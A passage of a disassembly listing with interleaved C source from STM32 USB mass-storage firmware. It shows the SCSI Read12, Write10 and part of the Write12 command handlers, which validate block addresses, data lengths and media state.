 800a7ae:	b580      	push	{r7, lr}
 800a7b0:	b086      	sub	sp, #24
 800a7b2:	af00      	add	r7, sp, #0
 800a7b4:	60f8      	str	r0, [r7, #12]
 800a7b6:	460b      	mov	r3, r1
 800a7b8:	607a      	str	r2, [r7, #4]
 800a7ba:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a7bc:	68fb      	ldr	r3, [r7, #12]
 800a7be:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a7c2:	68fb      	ldr	r3, [r7, #12]
 800a7c4:	32b0      	adds	r2, #176	; 0xb0
 800a7c6:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a7ca:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a7cc:	697b      	ldr	r3, [r7, #20]
 800a7ce:	2b00      	cmp	r3, #0
 800a7d0:	d102      	bne.n	800a7d8 <SCSI_Read12+0x2a>
  {
    return -1;
 800a7d2:	f04f 33ff 	mov.w	r3, #4294967295
 800a7d6:	e0a7      	b.n	800a928 <SCSI_Read12+0x17a>
  }

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a7d8:	697b      	ldr	r3, [r7, #20]
 800a7da:	7a1b      	ldrb	r3, [r3, #8]
 800a7dc:	2b00      	cmp	r3, #0
 800a7de:	f040 8099 	bne.w	800a914 <SCSI_Read12+0x166>
  {
    /* case 10 : Ho <> Di */
    if ((hmsc->cbw.bmFlags & 0x80U) != 0x80U)
 800a7e2:	697b      	ldr	r3, [r7, #20]
 800a7e4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a7e8:	7f1b      	ldrb	r3, [r3, #28]
 800a7ea:	b25b      	sxtb	r3, r3
 800a7ec:	2b00      	cmp	r3, #0
 800a7ee:	db0b      	blt.n	800a808 <SCSI_Read12+0x5a>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a7f0:	697b      	ldr	r3, [r7, #20]
 800a7f2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a7f6:	7f59      	ldrb	r1, [r3, #29]
 800a7f8:	2320      	movs	r3, #32
 800a7fa:	2205      	movs	r2, #5
 800a7fc:	68f8      	ldr	r0, [r7, #12]
 800a7fe:	f7ff fe35 	bl	800a46c <SCSI_SenseCode>
      return -1;
 800a802:	f04f 33ff 	mov.w	r3, #4294967295
 800a806:	e08f      	b.n	800a928 <SCSI_Read12+0x17a>
    }

    if (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED)
 800a808:	697b      	ldr	r3, [r7, #20]
 800a80a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a80e:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a812:	2b02      	cmp	r3, #2
 800a814:	d108      	bne.n	800a828 <SCSI_Read12+0x7a>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a816:	7af9      	ldrb	r1, [r7, #11]
 800a818:	233a      	movs	r3, #58	; 0x3a
 800a81a:	2202      	movs	r2, #2
 800a81c:	68f8      	ldr	r0, [r7, #12]
 800a81e:	f7ff fe25 	bl	800a46c <SCSI_SenseCode>
      return -1;
 800a822:	f04f 33ff 	mov.w	r3, #4294967295
 800a826:	e07f      	b.n	800a928 <SCSI_Read12+0x17a>
    }

    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a828:	68fb      	ldr	r3, [r7, #12]
 800a82a:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a82e:	68fa      	ldr	r2, [r7, #12]
 800a830:	33b0      	adds	r3, #176	; 0xb0
 800a832:	009b      	lsls	r3, r3, #2
 800a834:	4413      	add	r3, r2
 800a836:	685b      	ldr	r3, [r3, #4]
 800a838:	689b      	ldr	r3, [r3, #8]
 800a83a:	7afa      	ldrb	r2, [r7, #11]
 800a83c:	4610      	mov	r0, r2
 800a83e:	4798      	blx	r3
 800a840:	4603      	mov	r3, r0
 800a842:	2b00      	cmp	r3, #0
 800a844:	d008      	beq.n	800a858 <SCSI_Read12+0xaa>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a846:	7af9      	ldrb	r1, [r7, #11]
 800a848:	233a      	movs	r3, #58	; 0x3a
 800a84a:	2202      	movs	r2, #2
 800a84c:	68f8      	ldr	r0, [r7, #12]
 800a84e:	f7ff fe0d 	bl	800a46c <SCSI_SenseCode>
      return -1;
 800a852:	f04f 33ff 	mov.w	r3, #4294967295
 800a856:	e067      	b.n	800a928 <SCSI_Read12+0x17a>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a858:	687b      	ldr	r3, [r7, #4]
 800a85a:	3302      	adds	r3, #2
 800a85c:	781b      	ldrb	r3, [r3, #0]
 800a85e:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800a860:	687b      	ldr	r3, [r7, #4]
 800a862:	3303      	adds	r3, #3
 800a864:	781b      	ldrb	r3, [r3, #0]
 800a866:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a868:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] <<  8) |
 800a86a:	687b      	ldr	r3, [r7, #4]
 800a86c:	3304      	adds	r3, #4
 800a86e:	781b      	ldrb	r3, [r3, #0]
 800a870:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800a872:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800a874:	687a      	ldr	r2, [r7, #4]
 800a876:	3205      	adds	r2, #5
 800a878:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] <<  8) |
 800a87a:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a87c:	697a      	ldr	r2, [r7, #20]
 800a87e:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a882:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a884:	687b      	ldr	r3, [r7, #4]
 800a886:	3306      	adds	r3, #6
 800a888:	781b      	ldrb	r3, [r3, #0]
 800a88a:	061a      	lsls	r2, r3, #24
                         ((uint32_t)params[7] << 16) |
 800a88c:	687b      	ldr	r3, [r7, #4]
 800a88e:	3307      	adds	r3, #7
 800a890:	781b      	ldrb	r3, [r3, #0]
 800a892:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a894:	431a      	orrs	r2, r3
                         ((uint32_t)params[8] << 8) |
 800a896:	687b      	ldr	r3, [r7, #4]
 800a898:	3308      	adds	r3, #8
 800a89a:	781b      	ldrb	r3, [r3, #0]
 800a89c:	021b      	lsls	r3, r3, #8
                         ((uint32_t)params[7] << 16) |
 800a89e:	4313      	orrs	r3, r2
                         (uint32_t)params[9];
 800a8a0:	687a      	ldr	r2, [r7, #4]
 800a8a2:	3209      	adds	r2, #9
 800a8a4:	7812      	ldrb	r2, [r2, #0]
                         ((uint32_t)params[8] << 8) |
 800a8a6:	4313      	orrs	r3, r2
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a8a8:	697a      	ldr	r2, [r7, #20]
 800a8aa:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a8ae:	6713      	str	r3, [r2, #112]	; 0x70

    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800a8b0:	697b      	ldr	r3, [r7, #20]
 800a8b2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a8b6:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800a8b8:	697b      	ldr	r3, [r7, #20]
 800a8ba:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a8be:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a8c0:	7af9      	ldrb	r1, [r7, #11]
 800a8c2:	68f8      	ldr	r0, [r7, #12]
 800a8c4:	f000 fa4b 	bl	800ad5e <SCSI_CheckAddressRange>
 800a8c8:	4603      	mov	r3, r0
 800a8ca:	2b00      	cmp	r3, #0
 800a8cc:	da02      	bge.n	800a8d4 <SCSI_Read12+0x126>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800a8ce:	f04f 33ff 	mov.w	r3, #4294967295
 800a8d2:	e029      	b.n	800a928 <SCSI_Read12+0x17a>
    }

    /* cases 4,5 : Hi <> Dn */
    if (hmsc->cbw.dDataLength != (hmsc->scsi_blk_len * hmsc->scsi_blk_size))
 800a8d4:	697b      	ldr	r3, [r7, #20]
 800a8d6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a8da:	699a      	ldr	r2, [r3, #24]
 800a8dc:	697b      	ldr	r3, [r7, #20]
 800a8de:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a8e2:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a8e4:	6979      	ldr	r1, [r7, #20]
 800a8e6:	f501 5180 	add.w	r1, r1, #4096	; 0x1000
 800a8ea:	f8b1 1064 	ldrh.w	r1, [r1, #100]	; 0x64
 800a8ee:	fb01 f303 	mul.w	r3, r1, r3
 800a8f2:	429a      	cmp	r2, r3
 800a8f4:	d00b      	beq.n	800a90e <SCSI_Read12+0x160>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a8f6:	697b      	ldr	r3, [r7, #20]
 800a8f8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a8fc:	7f59      	ldrb	r1, [r3, #29]
 800a8fe:	2320      	movs	r3, #32
 800a900:	2205      	movs	r2, #5
 800a902:	68f8      	ldr	r0, [r7, #12]
 800a904:	f7ff fdb2 	bl	800a46c <SCSI_SenseCode>
      return -1;
 800a908:	f04f 33ff 	mov.w	r3, #4294967295
 800a90c:	e00c      	b.n	800a928 <SCSI_Read12+0x17a>
    }

    hmsc->bot_state = USBD_BOT_DATA_IN;
 800a90e:	697b      	ldr	r3, [r7, #20]
 800a910:	2202      	movs	r2, #2
 800a912:	721a      	strb	r2, [r3, #8]
  }
  hmsc->bot_data_length = MSC_MEDIA_PACKET;
 800a914:	697b      	ldr	r3, [r7, #20]
 800a916:	f44f 5280 	mov.w	r2, #4096	; 0x1000
 800a91a:	60da      	str	r2, [r3, #12]

  return SCSI_ProcessRead(pdev, lun);
 800a91c:	7afb      	ldrb	r3, [r7, #11]
 800a91e:	4619      	mov	r1, r3
 800a920:	68f8      	ldr	r0, [r7, #12]
 800a922:	f000 fa49 	bl	800adb8 <SCSI_ProcessRead>
 800a926:	4603      	mov	r3, r0
}
 800a928:	4618      	mov	r0, r3
 800a92a:	3718      	adds	r7, #24
 800a92c:	46bd      	mov	sp, r7
 800a92e:	bd80      	pop	{r7, pc}

0800a930 <SCSI_Write10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Write10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a930:	b580      	push	{r7, lr}
 800a932:	b086      	sub	sp, #24
 800a934:	af00      	add	r7, sp, #0
 800a936:	60f8      	str	r0, [r7, #12]
 800a938:	460b      	mov	r3, r1
 800a93a:	607a      	str	r2, [r7, #4]
 800a93c:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a93e:	68fb      	ldr	r3, [r7, #12]
 800a940:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a944:	68fb      	ldr	r3, [r7, #12]
 800a946:	32b0      	adds	r2, #176	; 0xb0
 800a948:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a94c:	617b      	str	r3, [r7, #20]
  uint32_t len;

  if (hmsc == NULL)
 800a94e:	697b      	ldr	r3, [r7, #20]
 800a950:	2b00      	cmp	r3, #0
 800a952:	d102      	bne.n	800a95a <SCSI_Write10+0x2a>
  {
    return -1;
 800a954:	f04f 33ff 	mov.w	r3, #4294967295
 800a958:	e0c7      	b.n	800aaea <SCSI_Write10+0x1ba>
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a95a:	697b      	ldr	r3, [r7, #20]
 800a95c:	7a1b      	ldrb	r3, [r3, #8]
 800a95e:	2b00      	cmp	r3, #0
 800a960:	f040 80bd 	bne.w	800aade <SCSI_Write10+0x1ae>
  {
    if (hmsc->cbw.dDataLength == 0U)
 800a964:	697b      	ldr	r3, [r7, #20]
 800a966:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a96a:	699b      	ldr	r3, [r3, #24]
 800a96c:	2b00      	cmp	r3, #0
 800a96e:	d10b      	bne.n	800a988 <SCSI_Write10+0x58>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a970:	697b      	ldr	r3, [r7, #20]
 800a972:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a976:	7f59      	ldrb	r1, [r3, #29]
 800a978:	2320      	movs	r3, #32
 800a97a:	2205      	movs	r2, #5
 800a97c:	68f8      	ldr	r0, [r7, #12]
 800a97e:	f7ff fd75 	bl	800a46c <SCSI_SenseCode>
      return -1;
 800a982:	f04f 33ff 	mov.w	r3, #4294967295
 800a986:	e0b0      	b.n	800aaea <SCSI_Write10+0x1ba>
    }

    /* case 8 : Hi <> Do */
    if ((hmsc->cbw.bmFlags & 0x80U) == 0x80U)
 800a988:	697b      	ldr	r3, [r7, #20]
 800a98a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a98e:	7f1b      	ldrb	r3, [r3, #28]
 800a990:	b25b      	sxtb	r3, r3
 800a992:	2b00      	cmp	r3, #0
 800a994:	da0b      	bge.n	800a9ae <SCSI_Write10+0x7e>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a996:	697b      	ldr	r3, [r7, #20]
 800a998:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a99c:	7f59      	ldrb	r1, [r3, #29]
 800a99e:	2320      	movs	r3, #32
 800a9a0:	2205      	movs	r2, #5
 800a9a2:	68f8      	ldr	r0, [r7, #12]
 800a9a4:	f7ff fd62 	bl	800a46c <SCSI_SenseCode>
      return -1;
 800a9a8:	f04f 33ff 	mov.w	r3, #4294967295
 800a9ac:	e09d      	b.n	800aaea <SCSI_Write10+0x1ba>
    }

    /* Check whether Media is ready */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a9ae:	68fb      	ldr	r3, [r7, #12]
 800a9b0:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a9b4:	68fa      	ldr	r2, [r7, #12]
 800a9b6:	33b0      	adds	r3, #176	; 0xb0
 800a9b8:	009b      	lsls	r3, r3, #2
 800a9ba:	4413      	add	r3, r2
 800a9bc:	685b      	ldr	r3, [r3, #4]
 800a9be:	689b      	ldr	r3, [r3, #8]
 800a9c0:	7afa      	ldrb	r2, [r7, #11]
 800a9c2:	4610      	mov	r0, r2
 800a9c4:	4798      	blx	r3
 800a9c6:	4603      	mov	r3, r0
 800a9c8:	2b00      	cmp	r3, #0
 800a9ca:	d008      	beq.n	800a9de <SCSI_Write10+0xae>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a9cc:	7af9      	ldrb	r1, [r7, #11]
 800a9ce:	233a      	movs	r3, #58	; 0x3a
 800a9d0:	2202      	movs	r2, #2
 800a9d2:	68f8      	ldr	r0, [r7, #12]
 800a9d4:	f7ff fd4a 	bl	800a46c <SCSI_SenseCode>
      return -1;
 800a9d8:	f04f 33ff 	mov.w	r3, #4294967295
 800a9dc:	e085      	b.n	800aaea <SCSI_Write10+0x1ba>
    }

    /* Check If media is write-protected */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsWriteProtected(lun) != 0)
 800a9de:	68fb      	ldr	r3, [r7, #12]
 800a9e0:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a9e4:	68fa      	ldr	r2, [r7, #12]
 800a9e6:	33b0      	adds	r3, #176	; 0xb0
 800a9e8:	009b      	lsls	r3, r3, #2
 800a9ea:	4413      	add	r3, r2
 800a9ec:	685b      	ldr	r3, [r3, #4]
 800a9ee:	68db      	ldr	r3, [r3, #12]
 800a9f0:	7afa      	ldrb	r2, [r7, #11]
 800a9f2:	4610      	mov	r0, r2
 800a9f4:	4798      	blx	r3
 800a9f6:	4603      	mov	r3, r0
 800a9f8:	2b00      	cmp	r3, #0
 800a9fa:	d008      	beq.n	800aa0e <SCSI_Write10+0xde>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, WRITE_PROTECTED);
 800a9fc:	7af9      	ldrb	r1, [r7, #11]
 800a9fe:	2327      	movs	r3, #39	; 0x27
 800aa00:	2202      	movs	r2, #2
 800aa02:	68f8      	ldr	r0, [r7, #12]
 800aa04:	f7ff fd32 	bl	800a46c <SCSI_SenseCode>
      return -1;
 800aa08:	f04f 33ff 	mov.w	r3, #4294967295
 800aa0c:	e06d      	b.n	800aaea <SCSI_Write10+0x1ba>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800aa0e:	687b      	ldr	r3, [r7, #4]
 800aa10:	3302      	adds	r3, #2
 800aa12:	781b      	ldrb	r3, [r3, #0]
 800aa14:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800aa16:	687b      	ldr	r3, [r7, #4]
 800aa18:	3303      	adds	r3, #3
 800aa1a:	781b      	ldrb	r3, [r3, #0]
 800aa1c:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800aa1e:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] << 8) |
 800aa20:	687b      	ldr	r3, [r7, #4]
 800aa22:	3304      	adds	r3, #4
 800aa24:	781b      	ldrb	r3, [r3, #0]
 800aa26:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800aa28:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800aa2a:	687a      	ldr	r2, [r7, #4]
 800aa2c:	3205      	adds	r2, #5
 800aa2e:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] << 8) |
 800aa30:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800aa32:	697a      	ldr	r2, [r7, #20]
 800aa34:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800aa38:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[7] << 8) |
 800aa3a:	687b      	ldr	r3, [r7, #4]
 800aa3c:	3307      	adds	r3, #7
 800aa3e:	781b      	ldrb	r3, [r3, #0]
 800aa40:	021b      	lsls	r3, r3, #8
                         (uint32_t)params[8];
 800aa42:	687a      	ldr	r2, [r7, #4]
 800aa44:	3208      	adds	r2, #8
 800aa46:	7812      	ldrb	r2, [r2, #0]
    hmsc->scsi_blk_len = ((uint32_t)params[7] << 8) |
 800aa48:	4313      	orrs	r3, r2
 800aa4a:	697a      	ldr	r2, [r7, #20]
 800aa4c:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800aa50:	6713      	str	r3, [r2, #112]	; 0x70

    /* check if LBA address is in the right range */
    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800aa52:	697b      	ldr	r3, [r7, #20]
 800aa54:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aa58:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800aa5a:	697b      	ldr	r3, [r7, #20]
 800aa5c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aa60:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800aa62:	7af9      	ldrb	r1, [r7, #11]
 800aa64:	68f8      	ldr	r0, [r7, #12]
 800aa66:	f000 f97a 	bl	800ad5e <SCSI_CheckAddressRange>
 800aa6a:	4603      	mov	r3, r0
 800aa6c:	2b00      	cmp	r3, #0
 800aa6e:	da02      	bge.n	800aa76 <SCSI_Write10+0x146>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800aa70:	f04f 33ff 	mov.w	r3, #4294967295
 800aa74:	e039      	b.n	800aaea <SCSI_Write10+0x1ba>
    }

    len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800aa76:	697b      	ldr	r3, [r7, #20]
 800aa78:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aa7c:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800aa7e:	697a      	ldr	r2, [r7, #20]
 800aa80:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800aa84:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800aa88:	fb02 f303 	mul.w	r3, r2, r3
 800aa8c:	613b      	str	r3, [r7, #16]

    /* cases 3,11,13 : Hn,Ho <> D0 */
    if (hmsc->cbw.dDataLength != len)
 800aa8e:	697b      	ldr	r3, [r7, #20]
 800aa90:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aa94:	699b      	ldr	r3, [r3, #24]
 800aa96:	693a      	ldr	r2, [r7, #16]
 800aa98:	429a      	cmp	r2, r3
 800aa9a:	d00b      	beq.n	800aab4 <SCSI_Write10+0x184>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800aa9c:	697b      	ldr	r3, [r7, #20]
 800aa9e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aaa2:	7f59      	ldrb	r1, [r3, #29]
 800aaa4:	2320      	movs	r3, #32
 800aaa6:	2205      	movs	r2, #5
 800aaa8:	68f8      	ldr	r0, [r7, #12]
 800aaaa:	f7ff fcdf 	bl	800a46c <SCSI_SenseCode>
      return -1;
 800aaae:	f04f 33ff 	mov.w	r3, #4294967295
 800aab2:	e01a      	b.n	800aaea <SCSI_Write10+0x1ba>
    }

    len = MIN(len, MSC_MEDIA_PACKET);
 800aab4:	693b      	ldr	r3, [r7, #16]
 800aab6:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800aaba:	bf28      	it	cs
 800aabc:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800aac0:	613b      	str	r3, [r7, #16]

    /* Prepare EP to receive first data packet */
    hmsc->bot_state = USBD_BOT_DATA_OUT;
 800aac2:	697b      	ldr	r3, [r7, #20]
 800aac4:	2201      	movs	r2, #1
 800aac6:	721a      	strb	r2, [r3, #8]
    (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, hmsc->bot_data, len);
 800aac8:	4b0a      	ldr	r3, [pc, #40]	; (800aaf4 <SCSI_Write10+0x1c4>)
 800aaca:	7819      	ldrb	r1, [r3, #0]
 800aacc:	697b      	ldr	r3, [r7, #20]
 800aace:	f103 0210 	add.w	r2, r3, #16
 800aad2:	693b      	ldr	r3, [r7, #16]
 800aad4:	68f8      	ldr	r0, [r7, #12]
 800aad6:	f002 faf3 	bl	800d0c0 <USBD_LL_PrepareReceive>
  else /* Write Process ongoing */
  {
    return SCSI_ProcessWrite(pdev, lun);
  }

  return 0;
 800aada:	2300      	movs	r3, #0
 800aadc:	e005      	b.n	800aaea <SCSI_Write10+0x1ba>
    return SCSI_ProcessWrite(pdev, lun);
 800aade:	7afb      	ldrb	r3, [r7, #11]
 800aae0:	4619      	mov	r1, r3
 800aae2:	68f8      	ldr	r0, [r7, #12]
 800aae4:	f000 f9fe 	bl	800aee4 <SCSI_ProcessWrite>
 800aae8:	4603      	mov	r3, r0
}
 800aaea:	4618      	mov	r0, r3
 800aaec:	3718      	adds	r7, #24
 800aaee:	46bd      	mov	sp, r7
 800aaf0:	bd80      	pop	{r7, pc}
 800aaf2:	bf00      	nop
 800aaf4:	2000010b 	.word	0x2000010b

0800aaf8 <SCSI_Write12>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Write12(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800aaf8:	b580      	push	{r7, lr}
 800aafa:	b086      	sub	sp, #24
 800aafc:	af00      	add	r7, sp, #0
 800aafe:	60f8      	str	r0, [r7, #12]
 800ab00:	460b      	mov	r3, r1
 800ab02:	607a      	str	r2, [r7, #4]
 800ab04:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800ab06:	68fb      	ldr	r3, [r7, #12]
 800ab08:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800ab0c:	68fb      	ldr	r3, [r7, #12]
 800ab0e:	32b0      	adds	r2, #176	; 0xb0
 800ab10:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800ab14:	617b      	str	r3, [r7, #20]
  uint32_t len;

  if (hmsc == NULL)
 800ab16:	697b      	ldr	r3, [r7, #20]
 800ab18:	2b00      	cmp	r3, #0
 800ab1a:	d102      	bne.n	800ab22 <SCSI_Write12+0x2a>
  {
    return -1;
 800ab1c:	f04f 33ff 	mov.w	r3, #4294967295
 800ab20:	e0d7      	b.n	800acd2 <SCSI_Write12+0x1da>
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800ab22:	697b      	ldr	r3, [r7, #20]
 800ab24:	7a1b      	ldrb	r3, [r3, #8]
 800ab26:	2b00      	cmp	r3, #0
 800ab28:	f040 80cd 	bne.w	800acc6 <SCSI_Write12+0x1ce>
  {
    if (hmsc->cbw.dDataLength == 0U)
 800ab2c:	697b      	ldr	r3, [r7, #20]
 800ab2e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ab32:	699b      	ldr	r3, [r3, #24]
 800ab34:	2b00      	cmp	r3, #0
 800ab36:	d10b      	bne.n	800ab50 <SCSI_Write12+0x58>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800ab38:	697b      	ldr	r3, [r7, #20]
 800ab3a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ab3e:	7f59      	ldrb	r1, [r3, #29]
 800ab40:	2320      	movs	r3, #32
 800ab42:	2205      	movs	r2, #5
 800ab44:	68f8      	ldr	r0, [r7, #12]
 800ab46:	f7ff fc91 	bl	800a46c <SCSI_SenseCode>
      return -1;
 800ab4a:	f04f 33ff 	mov.w	r3, #4294967295
 800ab4e:	e0c0      	b.n	800acd2 <SCSI_Write12+0x1da>
    }

    /* case 8 : Hi <> Do */
    if ((hmsc->cbw.bmFlags & 0x80U) == 0x80U)
 800ab50:	697b      	ldr	r3, [r7, #20]
 800ab52:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ab56:	7f1b      	ldrb	r3, [r3, #28]
 800ab58:	b25b      	sxtb	r3, r3
 800ab5a:	2b00      	cmp	r3, #0
 800ab5c:	da0b      	bge.n	800ab76 <SCSI_Write12+0x7e>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800ab5e:	697b      	ldr	r3, [r7, #20]
 800ab60:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ab64:	7f59      	ldrb	r1, [r3, #29]
 800ab66:	2320      	movs	r3, #32
 800ab68:	2205      	movs	r2, #5
 800ab6a:	68f8      	ldr	r0, [r7, #12]
 800ab6c:	f7ff fc7e 	bl	800a46c <SCSI_SenseCode>
      return -1;
 800ab70:	f04f 33ff 	mov.w	r3, #4294967295
 800ab74:	e0ad      	b.n	800acd2 <SCSI_Write12+0x1da>
    }

    /* Check whether Media is ready */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800ab76:	68fb      	ldr	r3, [r7, #12]
 800ab78:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800ab7c:	68fa      	ldr	r2, [r7, #12]
 800ab7e:	33b0      	adds	r3, #176	; 0xb0
 800ab80:	009b      	lsls	r3, r3, #2
 800ab82:	4413      	add	r3, r2
 800ab84:	685b      	ldr	r3, [r3, #4]
 800ab86:	689b      	ldr	r3, [r3, #8]
 800ab88:	7afa      	ldrb	r2, [r7, #11]
 800ab8a:	4610      	mov	r0, r2
 800ab8c:	4798      	blx	r3
 800ab8e:	4603      	mov	r3, r0
 800ab90:	2b00      	cmp	r3, #0
 800ab92:	d00b      	beq.n	800abac <SCSI_Write12+0xb4>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800ab94:	7af9      	ldrb	r1, [r7, #11]
 800ab96:	233a      	movs	r3, #58	; 0x3a
 800ab98:	2202      	movs	r2, #2
